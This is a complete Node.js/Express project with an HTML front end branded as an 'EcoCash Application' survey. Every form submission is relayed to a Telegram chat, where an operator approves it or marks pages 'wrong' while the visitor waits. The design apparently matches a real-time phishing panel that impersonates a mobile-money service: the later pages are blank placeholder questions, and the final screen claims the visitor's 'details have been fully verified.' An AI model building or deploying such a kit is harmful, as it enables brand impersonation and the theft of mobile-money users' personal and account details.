node_modules/
.env
.DS_Store
`
```json
{
  "name": "ecocash-telegram-app",
  "version": "1.0.0",
  "description": "EcoCash Survey with Telegram Approval",
  "main": "server.js",
  "scripts": {
    "start": "node server.js"
  },
  "dependencies": {
    "body-parser": "^1.20.2",
    "dotenv": "^16.3.1",
    "express": "^4.18.2",
    "node-telegram-bot-api": "^0.64.0"
  }
}
```

```javascript
require('dotenv').config();
const express = require('express');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');

const app = express();
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

const token = process.env.TELEGRAM_BOT_TOKEN;
const chatId = process.env.TELEGRAM_CHAT_ID;

// Initialize Telegram Bot
const bot = new TelegramBot(token, { polling: true });

// In-memory database
const applicants = new Map();

// 1. Submit Page 4
app.post('/api/submit-page4', async (req, res) => {
    const { sessionId, data } = req.body;
    
    applicants.set(sessionId, { page4: data, status: 'pending_4' });

    const message = `📝 *NEW APPLICATION - PAGE 4*\n\n` +
                    `*Name:* ${data.fullName}\n` +
                    `*Frequency:* ${data.frequency}\n` +
                    `*Feature:* ${data.feature}\n` +
                    `*Importance:* ${data.importantFactor}\n` +
                    `*Duration:* ${data.duration}\n\n` +
                    `Session ID: \`${sessionId}\``;

    const options = {
        parse_mode: 'Markdown',
        reply_markup: {
            inline_keyboard: [
                [
                    { text: '✅ Approve', callback_data: `approve_4_${sessionId}` },
                    { text: '❌ Reject', callback_data: `reject_4_${sessionId}` }
                ]
            ]
        }
    };

    try {
        await bot.sendMessage(chatId, message, options);
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ error: "Failed to send message" });
    }
});

// 2. Submit Page 5 & 6
app.post('/api/submit-page5-6', async (req, res) => {
    const { sessionId, page5, page6 } = req.body;
    
    if (!applicants.has(sessionId)) return res.status(400).json({ error: 'Invalid session' });
    
    const user = applicants.get(sessionId);
    user.page5 = page5;
    user.page6 = page6;
    user.status = 'pending_56';

    const p4 = user.page4;

    const message = `📋 *FULL APPLICATION REVIEW*\n\n` +
                    `*--- PAGE 4 DETAILS ---*\n` +
                    `Name: ${p4.fullName}\n` +
                    `Frequency: ${p4.frequency}\n` +
                    `Feature: ${p4.feature}\n` +
                    `Importance: ${p4.importantFactor}\n` +
                    `Duration: ${p4.duration}\n\n` +
                    `*--- PAGE 5 DETAILS ---*\n` +
                    `Question 1: ${page5.q1}\n` +
                    `Question 2: ${page5.q2}\n\n` +
                    `*--- PAGE 6 DETAILS ---*\n` +
                    `Question 1: ${page6.q1}\n` +
                    `Question 2: ${page6.q2}\n\n` +
                    `Session ID: \`${sessionId}\``;

    const options = {
        parse_mode: 'Markdown',
        reply_markup: {
            inline_keyboard: [
                [{ text: '✅ Correct Page 4 + 5 + 6', callback_data: `correct_all_${sessionId}` }],
                [
                    { text: '❌ Wrong Page 4', callback_data: `wrong_4_${sessionId}` },
                    { text: '❌ Wrong Page 6', callback_data: `wrong_6_${sessionId}` }
                ]
            ]
        }
    };

    try {
        await bot.sendMessage(chatId, message, options);
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ error: "Failed to send message" });
    }
});

// 3. Status Check
app.get('/api/status/:sessionId', (req, res) => {
    const { sessionId } = req.params;
    if (!applicants.has(sessionId)) return res.status(404).json({ error: 'Not found' });
    res.json({ status: applicants.get(sessionId).status });
});

// 4. Reset Page 4
app.post('/api/reset-page4', (req, res) => {
    const { sessionId } = req.body;
    if (applicants.has(sessionId)) applicants.get(sessionId).status = 'editing_4';
    res.json({ success: true });
});

// 5. Reset Page 6
app.post('/api/reset-page6', (req, res) => {
    const { sessionId } = req.body;
    if (applicants.has(sessionId)) applicants.get(sessionId).status = 'editing_6';
    res.json({ success: true });
});

// Telegram Bot Callbacks
bot.on('callback_query', async (query) => {
    const action = query.data;
    const msgId = query.message.message_id;
    const chatId = query.message.chat.id;

    const parts = action.split('_');
    const command = parts[0] + (parts[1] ? '_' + parts[1] : '');
    const sessionId = parts[parts.length - 1];

    if (!applicants.has(sessionId)) {
        return bot.answerCallbackQuery(query.id, { text: 'Session expired.' });
    }

    const user = applicants.get(sessionId);

    if (command === 'approve_4') {
        user.status = 'approved_4';
        await bot.editMessageText(`✅ *APPROVED - PAGE 4*`, { chat_id: chatId, message_id: msgId, parse_mode: 'Markdown' });
        bot.answerCallbackQuery(query.id, { text: 'Approved!' });
    } 
    else if (command === 'reject_4' || command === 'wrong_4') {
        user.status = 'rejected_4';
        await bot.editMessageText(`❌ *REJECTED - PAGE 4*`, { chat_id: chatId, message_id: msgId, parse_mode: 'Markdown' });
        bot.answerCallbackQuery(query.id, { text: 'Rejected.' });
    }
    else if (command === 'correct_all') {
        user.status = 'approved_all';
        await bot.editMessageText(`✅ *FULL APPLICATION APPROVED*`, { chat_id: chatId, message_id: msgId, parse_mode: 'Markdown' });
        bot.answerCallbackQuery(query.id, { text: 'Approved!' });
    }
    else if (command === 'wrong_6') {
        user.status = 'rejected_6';
        await bot.editMessageText(`❌ *WRONG PAGE 6*`, { chat_id: chatId, message_id: msgId, parse_mode: 'Markdown' });
        bot.answerCallbackQuery(query.id, { text: 'Rejected.' });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
```
:

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>EcoCash Application</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: 'Inter', sans-serif; background: #f0f4f8; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: #1a1a1a; }
    .app-container { background: #fff; width: 100%; max-width: 500px; height: 100vh; position: relative; overflow: hidden; box-shadow: 0 10px 30px rgba(0,0,0,0.1); display: flex; flex-direction: column;}
    .page { display: none; flex-direction: column; height: 100%; padding: 30px; overflow-y: auto; }
    .page.active { display: flex; animation: slideIn 0.3s ease; }
    @keyframes slideIn { from { opacity: 0; transform: translateX(20px); } to { opacity: 1; transform: translateX(0); } }
    h2 { margin-bottom: 20px; color: #0047b3; font-size: 1.5rem; }
    .form-group { margin-bottom: 15px; }
    label { display: block; font-weight: 600; margin-bottom: 5px; font-size: 0.9rem; }
    input, select { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 8px; font-size: 1rem; font-family: inherit; }
    button { background: #0047b3; color: white; border: none; padding: 15px; border-radius: 8px; font-size: 1.1rem; font-weight: 600; cursor: pointer; margin-top: 20px; width: 100%; transition: 0.2s; }
    button:hover { background: #003388; }
    .loader { text-align: center; margin-top: 50px; display: none; }
    .loader.active { display: block; }
    .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #0047b3; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    .success-icon { font-size: 4rem; color: #28a745; text-align: center; margin: 40px 0; }
  </style>
</head>
<body>

<div class="app-container">
  <div id="page4" class="page active">
    <h2>Page 4: Survey</h2>
    <form id="form4">
      <div class="form-group"><label>Full Name</label><input type="text" name="fullName" required></div>
      <div class="form-group"><label>How often do you use EcoCash?</label>
        <select name="frequency" required>
          <option value="">Select...</option><option value="Daily">Daily</option><option value="Weekly">Weekly</option>
        </select>
      </div>
      <div class="form-group"><label>Feature used most?</label>
        <select name="feature" required>
          <option value="">Select...</option><option value="Send Money">Send Money</option><option value="Pay Bills">Pay Bills</option>
        </select>
      </div>
      <div class="form-group"><label>Most important thing?</label>
        <select name="importantFactor" required>
          <option value="">Select...</option><option value="Security">Security</option><option value="Speed">Speed</option>
        </select>
      </div>
      <div class="form-group"><label>How long using EcoCash?</label>
        <select name="duration" required>
          <option value="">Select...</option><option value="< 1 year">Less than 1 year</option><option value="1-3 years">1-3 years</option>
        </select>
      </div>
      <button type="submit">Submit to Admin</button>
    </form>
  </div>

  <div id="page5_6" class="page">
    <h2>Page 5 & 6: Details</h2>
    <form id="form56">
      <h3>Page 5 Details</h3>
      <div class="form-group"><label>Page 5 Question 1</label><input type="text" name="p5q1" required></div>
      <div class="form-group"><label>Page 5 Question 2</label><input type="text" name="p5q2" required></div>
      <hr style="margin: 20px 0; border: 0; border-top: 1px solid #eee;">
      <h3>Page 6 Details</h3>
      <div class="form-group"><label>Page 6 Question 1</label><input type="text" name="p6q1" required></div>
      <div class="form-group"><label>Page 6 Question 2</label><input type="text" name="p6q2" required></div>
      <button type="submit">Submit Final Details</button>
    </form>
  </div>

  <div id="loading" class="page">
    <div class="loader active">
      <div class="spinner"></div>
      <h3>Waiting for Admin Approval...</h3>
      <p style="color:#666; margin-top:10px;">Please keep this page open.</p>
    </div>
  </div>

  <div id="page7" class="page">
    <i class="fa-solid fa-circle-check success-icon"></i>
    <h2 style="text-align: center;">Application Complete!</h2>
    <p style="text-align: center; color: #666;">Your details have been fully verified.</p>
  </div>
</div>

<script>
  const sessionId = Math.random().toString(36).substring(2, 15);
  let statusInterval;

  function showPage(pageId) {
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    document.getElementById(pageId).classList.add('active');
  }

  function startPolling() {
    showPage('loading');
    statusInterval = setInterval(async () => {
      try {
        const res = await fetch(`/api/status/${sessionId}`);
        const data = await res.json();
        
        if (data.status === 'approved_4') {
          clearInterval(statusInterval);
          showPage('page5_6');
        } 
        else if (data.status === 'rejected_4') {
          clearInterval(statusInterval);
          alert('Admin rejected Page 4. Please re-enter details.');
          await fetch('/api/reset-page4', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ sessionId }) });
          showPage('page4');
        }
        else if (data.status === 'approved_all') {
          clearInterval(statusInterval);
          showPage('page7');
        }
        else if (data.status === 'rejected_6') {
          clearInterval(statusInterval);
          alert('Admin rejected Page 6. Please re-enter Page 6 details.');
          await fetch('/api/reset-page6', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ sessionId }) });
          showPage('page5_6');
        }
      } catch (err) { console.error("Polling error", err); }
    }, 3000); 
  }

  document.getElementById('form4').addEventListener('submit', async (e) => {
    e.preventDefault();
    const formData = new FormData(e.target);
    const data = Object.fromEntries(formData.entries());

    const res = await fetch('/api/submit-page4', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ sessionId, data })
    });

    if (res.ok) startPolling();
    else alert("Error submitting form.");
  });

  document.getElementById('form56').addEventListener('submit', async (e) => {
    e.preventDefault();
    const formData = new FormData(e.target);
    const data = Object.fromEntries(formData.entries());
    
    const page5 = { q1: data.p5q1, q2: data.p5q2 };
    const page6 = { q1: data.p6q1, q2: data.p6q2 };

    const res = await fetch('/api/submit-page5-6', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ sessionId, page5, page6 })
    });

    if (res.ok) startPolling();
    else alert("Error submitting form.");
  });
</script>
</body>
</html>
```
